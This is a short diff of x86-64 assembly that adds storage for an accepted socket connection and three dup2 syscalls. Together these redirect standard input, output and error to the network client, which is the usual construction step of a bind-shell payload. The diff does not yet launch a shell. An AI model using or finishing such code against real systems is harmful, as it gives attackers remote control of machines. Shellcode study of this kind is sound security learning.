@@ -10,6 +10,7 @@ sin_zero dq 0
 
 section .bss
 result_socket resd 1
+result_socket_conn_accept resd 1 
 
 section .text
 
@@ -40,6 +41,24 @@ mov rdi, [result_socket]
 mov rsi, 0
 mov rdx, 0
 syscall
+
+mov [result_socket_conn_accept], rax
+
+mov rax, 0x21
+mov rdi, [result_socket_conn_accept]
+mov rsi, 0
+syscall
+
+mov rax, 0x21
+mov rdi, [result_socket_conn_accept]
+mov rsi, 1
+syscall
+
+mov rax, 0x21
+mov rdi, [result_socket_conn_accept]
+mov rsi, 2
+syscall
+
 
 mov rax,60
 mov rdi,0
